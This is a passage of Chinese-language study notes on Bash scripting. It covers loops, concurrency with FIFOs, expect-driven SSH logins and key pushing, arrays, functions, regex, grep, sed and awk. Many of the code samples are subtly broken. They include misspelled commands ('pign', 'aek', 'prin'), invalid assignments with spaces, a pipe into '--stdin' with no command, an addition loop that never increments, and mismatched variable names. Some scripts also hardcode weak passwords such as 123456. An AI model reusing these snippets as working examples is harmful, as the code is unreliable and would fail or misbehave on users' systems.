目前：通的放一个文件，不通的放一个文件 for ip in $(cat ip.txt) do { ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then ssh $ip echo "123" |passwd --stdin $user # 采用的公钥认证 if [ $? -eq 0 ];then echo "$ip" >>success_`date + %F`.txt else echo "$ip" >>failed_`date + %F`.txt fi else echo "$ip" >>failed_`date + %F`.txt fi }&amp; done wait echo "end!" 例子6：批量修改主机ssh设置 ssh $ip "sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config" # 搜索并替换(c) while循环 逐行读取文件的时候，while有优势 不用像for循环那样担心每一行的空格空行 所以：读取一个文件中逐行处理，while比for好用 例子1：创建用户 # 以后，读取一个文件中逐行处理，while比for好用 while read line: do # 判断用户数是否输入参数 if [ ${#line} -eq 0 ];then continue fi user = `echo $line|awk '{printf $1}'` pass = `echo $line|awk '{printf $2}'` id $user &amp;>/dev/null if [ $? -eq 0 ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;>/dev/null # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fi done &lt; $1 # 可以换成位置变量, 从文件里面读取用户名(read不用-p了) # done &lt; user.tx # 例子2：while实现连接测试 # 只要ping通就一直ping（【条件为true时候一直执行循环】） ip=192.168.0.5 while ping -c1 -W1 $ip &amp;>/dev/null; do sleep 1 done echo "$ip is down!" 例子3：until 实现连接测试 ip=192.168.0.5 until ping -c1 -W1 $ip &amp;>/dev/null; do sleep 1 done echo "$ip is up!" while 适合写主机下线 until 适合写主机上线 until循环形式 # 当条件测试为false时候执行循环体 until 条件测试 do 循环体 done 例子1：until实现数值运算 # i=1 until [ $i -gt 100 ] # >100 do let sum+=$i let i++ done echo "sum: $sum" 例子2：while实现数值运算 #数值运算：let i=1 while [ $i -le 100 ] # &lt;=100 do let sum+=$i done echo "sum: $sum" 并发 并发 —&gt; 多进程 之前写的传统并发的方式，多进程（返回是时间是乱序的） 缺点：有些并发数量太多，会报错 格式: ... { ... }&amp; wait ... 比如： for i in {1..254} do { ip=192.168.0.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then echo "$ip is up." else echo "$ip is down." fi }&amp; done wait echo "执行结束..." 控制并发的数量 ### 1). FD(File Descriptors)文件描述符 或 文件句柄 # 进程使用文件描述符来管理打开的文件（位置： /proc/进程id/fd/） # $$是当前进程 exec 6&lt;> /file1 # 1.手动指定描述符来 打开文件 echo "111" >> /proc/$$/fd/6 # 2.写入到了file1 # 3.删除file1 # 4.然后查看文件句柄: ll /proc/$$/fd # 会发现6显示删除状态 ## 5.把6这个文件拷贝出来变成file1,就又回来了（如果文件句柄没有删除或关闭。就算原文件被删除了，句柄依然在） ls of # 6.列出打开的文件 exec 6&lt;&amp;- # 7.释放文件的句柄 ### 2). 管道 ## 匿名管道(一个终端内使用) | ## 跨终端使用 mkfifo mkfifo /tmp/fifo1 # 创建 ll /dev > /tmp/fifo1 # 把dev重定向到管道中，另一个终端就可以用了 # 另一个终端使用： grep 'sda' /tmp/fifo1 例子： thread=5 tmp_fifofile=/tmp/$$.fifo mkfifo $tmp_fifofile exec 8&lt;> $tmp_fifofile rm $tmp_fifofile for i in `seq $thread` do echo >&amp;8 # 操作的是文件描述符（） done for i in {1..254} do read -u 8 # -u 是读取文件描述符内容（逐行） { ip=192.168.0.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ];then echo "$ip is up." else echo "$ip is down." fi echo >&amp;8 # 有借有还（借一个还一个，不能让文件描述符里面空） }&amp; done wait echo "执行结束. .." # 执行结果是5个5个出来的（因为定义的进程是5个） expect expect —-&gt; 不是shell，是一个新的语言 解决交互的繁琐操作 安装：apt install expect expect实现批量远程命令执行 # 如果for while，需要一步步的交互(比较麻烦)，但是可以使用公钥认证(ssh-keygen,ssh-copy-id) #第一步，实现了公钥认证 # ps:如果登录的新的机器与之前的指纹不一样，先删除本地保存的信息 # expect打前站，先把公钥推过去，后面再用别的实现 ssh初级例子1： #!/usr/bin/expect set ip 192.168.0.1 set user root set passwd 123456 set timeout 5 spawn ssh $user@$ip expect { #就是把接下来要出现的字符串等提前写好 "yes/no" { send "yes\r"; exp_continue } # 当出现什么，怎么处理(没出现就继续) "password:" { send "$passwd\r" }; } interact #交互停在对方那边不退出来 # 执行脚本: expect test.sh ssh初级例子2(升级版)： #!/usr/bin/expect set ip [lindex $argv 0] # 第一个位置参数(与shell的不通) set user [lindex $argv 1] set passwd 123456 set timeout 5 spawn ssh $user@$ip expect { #就是把接下来要出现的字符串等提前写好 "yes/no" { send "yes\r"; exp_continue } # 当出现什么，怎么处理(没出现就继续) "password:" { send "$passwd\r" }; } #interact # 交互停在对方那边不退出来 # 干点别的事情 expect "#" # 不用大括号也可以 #send "useradd xps\r" send "pwd\r" send "exit\r" expect eof # 结束expect 例子3：scp传递文件 ######## 升级版 #!/usr/bin/expect set ip [lindex $argv 0] # 第一个位置参数(与shell的不通) set user [lindex $argv 1] set passwd 123456 set timeout 5 spawn scp -r /etc/xxx $user@$ip:/tmp expect { #就是把接下来要出现的字符串等提前写好 "yes/no" { send "yes\r"; exp_continue } # 当出现什么，怎么处理(没出现就继续) "password:" { send "$passwd\r" }; } expect eof # 结束expect 例子4： 推公钥 # shell与expect一起用 #!/bin/bash >ip.txt passwd=123 #测试expect有没有装(以centos为例) rpm -q expect &amp;/dev/null if [ $? -ne 0 ];then yum -y install expect fi # 判断是否有公钥 if [ ! -f ~/.ssh/id_rsa ];then ssh-keygen -P "123" -f ~/.ssh/id_rsa # 指定公钥的密码和位置 fi for i in {2..254} do { ip=192.168.0.$i pign -c1 -W1 $ip &amp;/dev/null if [ $? -eq 0 ];then echo "$ip" >> ip.txt # 开始expect /usr/bin/expect &lt;&lt;-EOF set timeout 10 spawn ssh-copy-id $ip # 推送公钥。 前面必须都是tab，不能有空格（:set list 查看是tab还是空格） expect { "yse/no" { send "yes\r"; exp_continue } "password:" { send "$passwd\r" } } expect eof EOF fi }&amp; done wait echo "finish..." # 上一个例子, 已经实现了公钥认证，后面的操作就可以使用shell了，基本不用expect了 # 重启之后查看机器的ip，直接用get_ip.sh脚本（就不用了一个一个去看了） #!/bin/bash >ping.txt # {2..254} 集合， 另一个序列: seq `2 254` for i in {2..254} do { $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;>/dev/null if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi }&amp; 】 done wait echo "finish !!!" 五.数组没有多维数组这个概念 定义 1.普通数组 # 普通数组：只能使用整数作为数组索引 books=(linux shell awk docker) books=(linux shell awk [20]=docker) # 索引20为docker # 从文件赋值 books2=(`cat /etc/passwd`) books=(`ls /etc/`) # 中间值可以跳过 2.关联数组 # 关联数组：可以使用字符串作为数组索引（相当于字典） declare -A info # 先声明是关联数组 info ([name]=xps [sex]=male [age]=20 [skill]=security) # 赋值 使用 echo ${books[3]} echo ${info[name]} # 查看所有的数组 declare -a # 查看所有的关联数组 declare -A # 获取数组元素的索引号 echo ${info[@:1]} # 从数组下标1开始 echo ${info[@:1:2]} # 从数组下标1开始，访问两个元素 # 获取所有的索引key echo ${!info[@]} # 统计元素个数 echo ${#info[@]} # 数组中所有元数（等同于： ${info[*]} ） echo ${info[@]} 遍历 1.按照个数遍历 2.按照索引遍历 例子: #while方式 i=0 while read line do hosts[++i]=$line #hosts是个数组 done &lt;/etc/hosts for j in ${!hosts[@]} do echo "$i: ${hosts[i]}" done ########################################################################3 # for方式 不是以换行分割（按照空格,tab等分割） OLD_IFS=$IFS IFS=$'\n' # 解决 for i in ${!hosts[@]} do echo "$i: ${hosts[i]}" done for j in ${!hosts[@]} do echo "$i: ${hosts[i]}" done IFS=$OLD_IFS # 不是全文都要，如果后门想用回车作为分隔符号 实例 #!/bin/bash ## 1. 性别次数统计 ## 其实用awk一行搞定 awk '{print $2}' sex.txt |sort |uniq -c ## 这里还是先学基础的（`把要统计的对象作为数组的索引` ，首先是关联数组） #!/bin/bash declare -A sex while read line do # 里面的第二列（m/f） type=`echo $line |awk '{print $2}'` let sex[$type]++ # sex[m]++ 性别的数量增加 done &lt; sex.txt # 遍历(通过索引) for i in ${!sex[@]} # 获取所有的索引key do echo "$i: ${sex[$i]}" #变量尽量加$ done ### 2. 统计不同类型shell的数量 # /etc/passwd中 #!/bin/bash declare -A shells # 先定义关联数组 while read line do # 里面的第二列 type=`echo $line |awk -F":" '{print $7}'` #按照冒号分割 {print $NF}最后一列 let shells[$type]++ # sex[m]++ 性别的数量增加 done &lt; /etc/passwd #输出 for i in ${!shells[@]} do echo "$i: ${shells[$i]}" # /bin/bash : 5 done ### 这是awk的强项 awk -F":" '{print $NF}' /etc/passwd |sort |uniq -c ## 3. 统计tcp连接状态数量 #ss -an |grep 80 #!/bin/bash while : do unset status # 取消， 重新声明 declare -A status # 先定义关联数组 type=`ss -an |grep :80 |aek '{print $2}'` # 要统计的(是一个arr) for i in $type do let status[$i]++ done #输出 for i in ${!status[@]} do echo "$i: ${status[$i]}" # SYN-SENT: 5 done sleep 1 clear done # 思想: 把要统计的对象最为索引，一直累加 ## 拓展： ## 一.如果想一直看 # 1. watch -n2 test.sh # 每几秒看一次 # 2. 脚本里面while循环(更麻烦) ## 二.vim部分复制粘贴： # ^V 块选择，然后按y复制， 最后找到地方p粘贴 六.函数定义 # F1: 函数名(){ 功能 } # F2: funcion 函数名{ 功能 } 调用 调用1 #例子：阶乘 #!/bin/env bash factorial(){ fat=1 for((i=1;i&lt;=50;i++)) do fac=$[$fac*$i] done echo "5的阶乘:$fac" } factorial # 调用 调用2 #!/bin/env bash factorial(){ fat=1 for((i=1;i&lt;=$num;i++)) do fac=$[$fac*$i] done echo "$num的阶乘:$fac" } num=5 # 调用之前先定义变量 factorial 调用3 #!/bin/env bash factorial(){ fat=1 for i in `seq $1` do let fac*=$i done echo "$1的阶乘:$fac" } factorial $1 # 位置变量，调用 调用4 # 如果函数再另一个文件里面，先执行一下，后面再调用 ./f1.sh 返回值 #!/bin/env bash fun2(){ read -p "enter a number:" num let 2*$num return $[2*$num] } fun2 echo "funcion return value: %?" # 上一个命令的返回值（函数值最后一条命令的返回的状态码） echo "funcion return: $?" # 函数的返回值(也可以自定义，但是默认shell返回码,最大不能超过255) 如果想返回字符串等: 函数的输出 #!/bin/env bash fun2(){ read -p "enter a number:" num echo $[2*$num] # echo } result=`fun2` # 使用函数的输出 echo "return_out value: $result" 参数的传递 1.位置参数 #!/bin/env bash if [ $# -ne 3 ];then # 如果参数不是三个 echo "Usage: `basename $0`par1 par2 par3 " exit fi function parm_func(){ echo "$(($1 * $2 * s3))" } result=`parm_func $1 $2 $3` # 分清：程序的位置参数，函数的位置参数 echo "result is: $result" 2.数组 #!/bin/env bash num=(1,2,3,4,5) #echo "${num[@]}" #打印所有元素 arr_parm() { local fa=1 ## 局部变量，只在函数内部生效 for i in "$@" #for i in $* do let fa*=$i done echo "$fa" } #arr_parm ${num[@]} arr_parm ${num[*]} # 数组所有 元素值 # 拓展： # for i in $* # 所有参数 # for i 传数组到函数中 –&gt; 运算 –&gt; 输出数组形式 #!/bin/env bash num=(1,2,3,4,5) array() { #echo "所有参数: $*" local new_arr=(`echo $*`) #local new_arr=($*) local i for ((i=0;i&lt;$#;i++)) do out_arr[$i]=$[ ${[$i]}*5 ] done echo "${out_arr[*]}" } result=`array${num[*]}` echo ${result[*]} #!/bin/env bash num=(1,2,3,4,5) array() { local i local new_arr=() for i in $* do new_arr[j++]=$[$i*5] done echo "${new_arr[*]}" } result=`array${num[*]}` echo ${result[*]} # 函数接收位置参数 $1 $2 $3 # 函数接收数组参数 $* 或 $@ #函数将接收到的所有参数赋值给数组 new_arr=($*) 七.正则大多数程序中，正则表达式被放在两个正斜杠之间, 比如：/L[oO]ve/ 入门小例子 # 简单实例（不严谨的例子，我们写shell脚本没必要写那么复杂，我们的脚本是给自己用的多） 匹配数字： ^[0-9]+$ 匹配Email： [a-z0-9_]+@[a-z0-9]+\. 匹配IP： [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} 或者 [[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]{1,3} # egrep '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /etc/sysconfig/network-scripts/ifcfg-eth0 正则 元字符 注意和shell的元字符是不太一样的 # 由执行模式匹配的操作的程序来解析，比如vi，grep，sed，awk，python # 只要不是shell，就是正则的元字符 rm -rf *.pdf # shell中的*， 匹配任意 grep 'c*' /etc/passwd # c出现0次或者多次 egrep 'c+' /etc/passwd # +要使用egrep或反斜杠 vim中替换： `:%s/\&lt;[tT]om\>/TOM/g` # 尖括号括起来的是单词 ## 例子： grep "sh$" /etc/passwd grep "ro*t" /etc/passwd grep "^[rot]" /etc/passwd # 以r或o或t开头的 1.基本元字符 ^ 行首定位符 ^love $ 行位定位符 love$ . 匹配单个字符 l..e * 匹配前导符0到多次 ab*love .* 任意多个字符 [] 匹配指定范围内的一个字符 [lL]ove [-] 匹配指定范围内的一个字符 [a-z0-9]ove [^] 匹配不再指定组内的一个字符 [^a-z0-9]ove \ 用来转义元字符 love\. \&lt; 词首定位符 \&lt;love \> 词尾定位符 love\> \(..\) 匹配稍后使用的字符的标签 :%s/172.16.130.1/172.16.130.5/ :%s/\(172.16.130.\)1/\15/ :%s/\(172.\)\(16.\)\(130.\)1/\1\2\35/ :3,9s/\(.*\)/#\1/ # 把第3-9行整行注释掉 # 大括号每一半前面要加斜线记得 x\{m\} 字符x重复出现m次 o\{5\} x\{m,\} 字符x重复出现m次以上 o\{5,\} x\{m,n\} 字符x重复出现m次 o\{5,10\} 2.拓展正则表达式元字符 + 匹配一个或多个前导字符 [a-z]+ove ? 匹配零个或一个前导字符 lo?ve # o出现0次或1次 ss -an |egrep ':80:22\>' a|b 匹配a或b love|hate () 组 字符 loveablle|rs love(able|rs)ov+ (ov)+ ov+ # 里面内容作为一个整体 (..)(..)\1\2 标签匹配字符 (love)able\1er # 不带斜线 x{m} 字符x重复出现m次 o{5} x{m,} 字符x重复至少m次 o{5,} x{m,n} 字符x重复m到n次 o{5,10} 3.POSIX字符类 （类似于shell中环境变量，已经定义好的） [:alnum:] 字母与数字字符 [[:alnum:]]+ # 外面的方括号是包里面的 [:alpha:] 字母字符（包括大小写字母） [[:alpha:]]{4} [:blank:] 空格与制表符 [[:blank:]]* [:digit:] 数字 [[:digit:]]? [:lower:] 小写字母 [[:lower:]]{5,} [:upper:] 大写字母 [[:upper:]]+ [:punct:] 标点符号 [[:punct:]] [:space:] 包括换行符、回撤等在内的所有空白 [[:space:]]+ 带括号与不带括号： 正则匹配实例：vim中查找替换 # 空行： /^$/ /^[\t]*$/ # 注释行： /^#/ /^[\t]*#/ grep grep 文件中查找指定的正则表达式 egrep 拓展的egrep，支持更多的正则表达式元字符 fgrep 固定grep(fixed grep),有时也被称作快速(fast grep), 它按字面解释所有的字符 #过滤（尽量加引号） grep [选项] PATTERN 文件 文件 文件 grep -q "root" /etc/passwd : echo $? # 返回值： # 0 找到 # 1 没找到 # 2 找不到指定文件 # grep的输入可以来自：文件、标准输入、管道 ss -an |grep ":22$" ll |grep '^d' # 找出目录 使用的元字符 grep： 使用基本元字符集 ^, $, ., *, [], [^], \&lt;\>, \(\), \{\}, \+, egrep： 使用扩展元字符集 ?, +, {}, |, () # Note: grep也可以使用扩展元字符集，仅需再这些元字符前置一个反斜线(尖号不行) \w 所有字母与数字，称之为字符，即 [a-zA-Z0-9] \W 与上面相反，非字符 [^a-zA-Z0-9] \b 词边界 # grep -E 或 egrep grep选项 -v 取反，只显示不匹配的 -i 忽略大小写 -l 只列出匹配行所在的文件名(哪些文件里面有这些匹配) -n 再每一行前面加上他所在文件中的相对行号 -c 显示成功匹配的行数 -s 禁止显示文件不存在或文件不可读的错误信息 -q 静默 --color 颜色 -R, -r 递归针对目录 -o 只显示匹配的内容 -B 前几行 grep -C2 'root' /etc/passwd -A 后几行 -C 上下几行 nmap --help |grep '\-u' # 查看帮助文档里的-u 八.sedsed: 流编辑器，在线的、非交互式的编辑器（而vi是交互式的） sed工作流程 文本文件 -&gt; sed的模式空间(缓冲区) –&gt; 输出 命令格式 #sed [options] 'cmd' file(s) sed [options] -f scriptfile file(s) sed不管是够找到指定的模式，他的退出状态都是0。 只有当命令语法存在错误时候，才是非0 可以在命令行，也可以在脚本里面使用 sed 'd' /etc/test # d 删除 sed '4d' /etc/test # 4d 删除第四行 # i 修改文件(不是输出到屏幕上) 支持正则表达式 支持的元字符 # 基本元字符集: ^, $, ., *, [], [^], \&lt;\>, \(\), \{\} # 扩展元字符集: ?, +, {}, |, () 使用扩展元字符的方式 sed --help|grep '\-r' # \+ sed -r 基本用法： sed -r '' /etc/test # '' 没任何动作 sed -r 'd' /etc/test sed -r 'p' /etc/test # p 打印 sed -r -n 'p' /etc/test sed -r -n '/root/p' /etc/test # -n 静默方式 # 上面四种不建议用(打印这种事情用不着sed，有别的打印就行) ### 下面的功能才重点学 sed -r 's/root/xps' /etc/test # 所有行查找替换,root换成大小写（只替换一次） sed -r 's/root/xps/g' /etc/test # g 全局 sed -r 's/root/xps/gi' /etc/test # i 忽略大小写 sed -r '/root/d' /etc/test # 没有s就是查找， 查找带root的行，然后删除 sed -r '\#root#d' /etc/test # 查找：可以使用#等符号-->不一定要斜线，但是前面要加\转义；查找替换:不用转义 地址(定址) #!/bin/bash # 用于决定对哪些行进行编辑。地址形式可以是数字、正则或二者的结合(如果没有指定,sed将处理输入文件中的所有行) sed -r 'd' /etc/test sed -r '3d' /etc/test sed -r '1,3d' /etc/test sed -r '/root/d' /etc/test # 删除root的行 sed -r 'root/,5d' /etc/test # 从root行开始，到第5行删除 sed -r 's/root/xps/g' /etc/test # 替换 sed -r '/^adm/,20d' /etc/test # 从adm开头的那一行，删除到第20行 sed -r '/^adm/,+20d' /etc/test # 从adm开头的那一行，再往后删除20行 sed -r '/2,5d' /etc/test # 第二行到第五行 sed -r '/root/d' /etc/test # 带root的行删除 sed -r '/root/!d' /etc/test # 除了root行以外都删除 sed -r '1~2d' /etc/test # 删除所有奇数行(从1开始，每隔两行删) sed -r '0~2d' /etc/test # 删除所有偶数行 # 拓展： vim中： 使用 `:r /etc/passwd` 来读取文件内容 命令 # 告诉sed对指定行进行何种操作 a 在当前行后添加一行或多行 c 用新文本修改(替换)当前行中的文本 d 删除行 i 在当前行前插入文本 l 列出非打印字符 p 打印行 n 读入下一输入行，并从下一条命令而不是第一条命令开始对其的处理 q 结束或退出sed ! 取反(对所选行以外的所有行应用) s 用一个字符串替换另一个 s 替换标志 g 在行内进行全局替换 i 忽略大小写 r 从文件中读 w 将行写入文件 y 将字符转换为另一个字符（不支持正则） h 把模式空间里的内容复制到暂存缓冲区(覆盖) H 把模式空间里的内容支架到暂存缓冲区中 g 取出暂存缓冲区中的内容，将其复制到模式空间，覆盖该处原有内容 G 取出暂存缓冲区中的内容，将其复制到模式空间，追加在原有内容后门 x 交换暂存缓冲区域模式空间的内容 例子 ## 例子 # d 删除 sed -r '3d' datefile # 删除第三行 sed -r '3d' datefile sed -r '3{d;}' datefile sed -r '3d{h:d}' datefile # 先保存，再删除 sed -r '3,$d' datefile # 删除3到最后一行 sed -r '$d' datefile # 删除最后一行 sed -r '/nrth/d' datefile # 删除满足这个匹配的行 # s 替换 sed -r 's/west/north/g' datefile sed -r 's/^west/north/' datefile sed -r 's[0-9][0-9]$/&amp;.5' datefile # &amp;代表在查找串中匹配到的内容 # 拓展vim中在某行的后门加上xxx： :3,5s/.*/&amp;XXX/g #vim拓展1: :%s/.*/#&amp;/g 在所有行前面加注释 #vim拓展1: :3,5s/~/#&amp;/ 和sed是一样的 sed -r '%s/(.)(.)(.*)/\1xxx\2\3/' passwd # 把每行第二个字符前面加xxx sed -r 's/(Mar)got/\1inane/g' datefile # r 读文件 sed -r 's/Suan/r /etc/newfile' datefile # 到Suan这一行的时候，读入一个新文件 sed -r '2r /etc/hosts' a.txt # 处理到第二行的时候，读入一个新文件 sed -r '/2r /etc/hosts' a.txt # /2 带有2的时候，读入... # w 写文件 sed -r '/north/w newfile' datafile # 把north的行保存到新文件中去 sed -r '3,$w /new.txt' datafile # 第三行到最后一行，保存... # a 追加 sed -r '/root/a 1111111' datafile # 有root的行，就在后面添加11111 sed -r '2a/ 1111111' datafile # 第二行，添加 111111111 # i 在前面插入 sed -r '/root/i 1111111' datafile # 有root的行，就在前面添加11111 sed -r '2i/ 1111111' datafile # 第二行，在前面添加 111111111 # c 修改替换 sed -r '2c/ 1111111' datafile # 第二行，替换为 111111111 # n 获取下一行命令 sed -r '/eastern/{n; d}' datafile # 这行没有明显标志，用上面明显的隔山打牛 # G g H h 暂存和取用命令 sed -r '1h;$G' /etc/hosts # 处理到第一行时候，暂存；到最后一行，取过来 （第一行复制到最后一行） sed -r '1{h;d};$G' /etc/hosts # 第一行移动到最后一行 sed -r '1h;2,$G' /etc/hosts # 处理到第一行时候，暂存;到第二行和最后一行，取过来 模式空间/暂存空间 ## 小写是覆盖，大写是追加 模式空间 h H --> 暂存空间 模式空间 &lt;--- g G 暂存空间 sed -r 'G;G' /etc/hosts # 所有行 sed -r 'g;g' /etc/hosts # 暂存空间个模式空间互相转换命令 x sed -r '4h; 5x; 6G' /etc/hosts # 处理到第四行覆盖到暂存空间，到第五行:。。。 反向选择 sed -r '3d' /etc/hosts sed -r '3!d' /etc/hosts 多重编辑选项 # -e sed -r -e '1,3d' -e 's/java/python/' datafile # 第一行到第三行删除，后面的替换覆盖 sed -r '2{s/java/python/g; s/php/go/g}' datafile # 一行里面替换两次 常见操作 ############ 常见操作 # 删除#注释行 sed -ri '/^#/d' file.conf # 这种情况必须是第一个就是注释符 sed -ri '/^[\t]*#/d' file.conf # 如果是前面有空格或tab然后才是注释符 # 删除//注释行 sed -ri '\Y/^[\t]*//Yd' file.conf # 删除无内容空行 sed -ri '/^[\t]*$/d' file.conf # 删除注释行及空行 sed -ri '/^[\t]*#|^[\t]*$/d' file.conf sed -ri '/^[\t]*(#|$)/d' file.conf # #加注释（vim是一样是） :%s/.*/#&amp;/g 在所有行前面加注释 :3,5s/^/#&amp;/ 和sed是一样的 sed -r '1,5s/^/#/' c.txt sed -r '3,$ s/^#*/#/' c.txt # 将行首0到多个井换成一个井 # 如果井前有空格或tab等 sed -r '3,$ s/^[\t]*#*/#/' c.txt # sed使用外部变量(使用双引号) var1=111 sed -ri "3a$val1" /etd/hosts sed -ri '$a'"$val1" /etd/hosts # 第一个单引号是`最后一行`，第二个里面是变量 sed -ri "\$a$val1" /etd/hosts # 把$a转义一下也行 cat a.txt tac a.txt # 从后往前倒序（ sed -r '1!G; $!d' a.txt 推导一下弄明白 ） 九.awk awk本身也是一种编程语言（ps:我们使用的不是纯粹的awk，而是gawk） sed是修改文件 awk是用来统计 语法格式 awk [options] 'cmd' filenames options 选项 -F 指定分隔符，默认是空格或tab command # BEGIN{} 行处理前 # {} 行处理（有几行就处理几次） # END 行处理后 awk 'BEGIN{print 1/2} {print "ok"}END{print "------"}' /etc/hosts # BEGIN{} 通常用于定义一些变量，比如: BEGIN{FS=":";OFS="---"} # OFS 输出时候的字段分隔符 awk 'BEGIN{FS=":"} {print $1}' passwd # 在处理之前，(FS)就指定了分隔符 awk命令格式 # awk 'pattern' filename awk '/root/' /etc/passwd # awk '{action}' filename awk -F: '{print $3}' /etc/passwd # awk 'pattern {action}' filename awk -F":" '/root/{print $3}' /etc/passwd awk 'BEGIN{FS=":"} /root/{print $3}' /etc/passwd # command |awk 'pattern {action}' df -P |grep '/' |awk '$4'>25000 {print $4} # 除去第一行，如果大于25000就打印第四列 awk工作原理 记录与字段相关的内部变量 ## 可以通过 man awk 查看 # $0 awk变量保存当前记录的内容 awk -F":" '{print $0}' /etc/passwd # NR 输入记录总的编号，显示行号 awk -F":" '{print NR,$0}' /etc/passwd # FNR 当前记录文件的编号(处理多个文件，每个文件重新开始编号) awk -F":" '{print FNR,$0}' /etc/passwd /etc/passwd # NF: 保存记录的字段数(这一行一共有多少字段), $NF代表最后一个字段 awk -F":" '{print $0,NF,$NF}' /etc/passwd # FS 输入字段分隔符，默认空格或tab awk 'BEGIN{FS=":"} {print $0}' /etc/passwd awk -F'[:\t]' '{print $0,NF,$NF}' /etc/passwd # OFS 输入字段分隔符，默认空格, OFS:输出分隔符 awk 'BEGIN{FS=":";OFS="+++"} {print $0}' /etc/passwd # RS --记录分隔符(区分与FS字段分隔符) 默认换行符 awk 'BEGIN{RS=":"} {print $0}' /etc/passwd # ORS awk 'BEGIN{ORS=":"} {print $0}' /etc/passwd # 将文件每一行合并为一行（ORS 输出记录分隔符） awk 'BEGIN{ORS=""} {print $0}' /etc/passwd 格式化输出 # 1.print # 2.printf 可以格式化（默认没有换行，手动加\n） date |awk '{print "Month:" $2"\nYear: " $NF}' # 只要不是变量，就要放到双引号里面 # %s 字符串（-15s 15个字符，左对齐） %f 浮点型， %d数值类型 awk -F: '{printf "%-15s %-10s %-15s\n", $1,$2,$3}' /etc/passwd awk模式和动作 模式：条件语句，复合语句，正则表达式。 包括两个特殊字典：BEGIN和END ### 模式可以是 ======= 正则表达式 # 匹配记录（整行） awk '/^xps/' /etc/passwd # awk '$0 ~ /^xps/' /etc/passwd # ~ 匹配 awk '!/xps/' /etc/passwd # awk '$0 !~ /^xps/' /etc/passwd # 匹配字段：匹配操作符(~!~) awk -F: '$1 ~ /^xps/' /etc/passwd # awk -F: '$NF !~ /^bash$/' /etc/passwd # 最后一列不是以bash结尾的 ======= 比较表达式 # 用于比较 数字 与 字符串 # > &lt; == awk -F: '$3 == 0' /etc/passwd awk -F: '$3 == "/xps/"' /etc/passwd # == 全部等于 awk -F: '$3 ~ /xps/' /etc/passwd # 正则匹配 awk -F: '$NF ~ /xps/' /etc/passwd ======= 条件表达式 awk -F: '$3>200{print $0}' /etc/passwd # $3大于200的，$0 awk -F: '{ if($3>200) {print $0} }' /etc/passwd # 推荐这么写 { if(){cmd1;cmd2} else{} } awk -F: '{ if($3>200) {print $0} else{print $1} }' /etc/passwd ======= 算数运算 #awk都按浮点数方式执行算数运算 awk -F: '$3 * 10 > 500' /etc/passwd awk -F: '{ if($3*10>500){print $0} }' /etc/passwd # 如果$3*10>500，就... ======= 逻辑操作符和复合模式 &amp;&amp; 逻辑与 || 逻辑或 ！ 逻辑非 awk -F: '$1~/root/ &amp;&amp; $3&lt;=15' /etc/passwd awk -F: '$1~/root/ || $3&lt;=15' /etc/passwd awk -F: '!($1~/root/ &amp;&amp; $3&lt;=15)' /etc/passwd ======= 范围模式 awk '/Tom,/Susan/' filename awk脚本编程 ### awk脚本编程 ====== 条件编程 awk -F":" '{if(){} else if(){} else{}}' passwd awk -F":" '{if($3>0 &amp;&amp; $3&lt;1000){count++}} END{print count}' /etc/passwd # 统计系统用户数 awk -F":" '{if($3==0){count++}} else{i++} END{print "管理员个数："count; print "系统用户个数:"i}' /etc/passwd awk -F":" '{if($3==0){i++}} else if($3&lt;999){j++} else{k++} END{print "管理员个数："i; print "普通用户个数:"j; print "系统用户个数:"k}' /etc/passwd ====== 循环 # 1.while 依此打印每一列 awk -F":" '{i=1;while(i&lt;7){print $i;i++}}' /etc/passwd awk -F":" '/^root/{i=1;while(i&lt;7){print $i;i++}}' /etc/passwd awk -F":" '{i=1;while(i&lt;=NF){print $i;i++}}' /etc/passwd awk '{i=1;while(i&lt;=NF){print $i;i++}}' a.txt # 打印文件所有内容(默认是空格和tab分割) # 2.for awk 'BEGIN{for(i=1;i&lt;=5;i++){prin i}}' # c风格的 awk -F: '{for(i=1;i&lt;=NF;i++){prin $i}}' passwd awk -F: '{for(i=1;i&lt;=NF;i++){prin $0}}' passwd # 将每行打印10次 ====== 数组 (用来统计) awk -F: '{username[++i]=$1} END{print username[1]}' /etc/passwd awk -F: '{username[i++]=$1} END{print username[1]}' /etc/passwd awk -F: '{username[i++]=$1} END{print username[0]}' /etc/passwd ## 数组遍历(主要用按索引遍历) # username数组名， 先保存到数组中，再进行遍历 awk -F: '{username[i++]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd awk -F: '{username[++i]=$1} END{for(i in username) {print i,username[i]}}' /etc/passwd 基本练习 ###### 基本练习 ### 1. 统计/etc/passwd 中各种shell的数量 # # 把要统计的对象作为数组的索引(这里是最后一个$NF,也就是shell的类型) awk -F: '{shells[$NF]++} END{for(i in shells){print i,shells[i]}}' /etc/passwd ### 2.网站访问状态统计 netstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' netstat -ant |grep :80 |awk '{access_stat[$NF]++} END{for(i in access_stat){print i,access_stat[i]}}' |sort -k2 -n |head ss -ant |grep :80 |awk '{access_stat[$2]++} END{for(i in access_stat){print i,access_stat[i]}}' ### 3.统计当前访问的每个IP的数量 &lt;当前实时状态 netstat, ss> netstat -ant |grep :80 |awk -F: '{ip_count[$8]++} END{for(i in ip_count){print i,ip_count[i]}}' # 下面这个有点复杂了，不推荐用 ss -ant |grep :80 |awk -F: '!/LISTEN/{ip_count[$(NF-1)]++} END{for(i in ip_count){print i,ip_count[i]}}' |sort 0k2 -rn |head 5 ### 4.统计Apache/Nginx日志中某一天的PV量 &lt;统计日志> grep '07/Aug/2019' access.log |wc -l # wc -l 统计行数 ### 4.统计Apache/Nginx日志中某一天不通IP的PV量 &lt;统计日志> grep '07/Aug/2019' access.log |awk '{ips[$1]++} END{for(i in ips){print i, ips[i]}}' |sort -k2 -rn | head awk '/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}' # >100的才打印（此方法有点low，可用下面的几种方法） awk 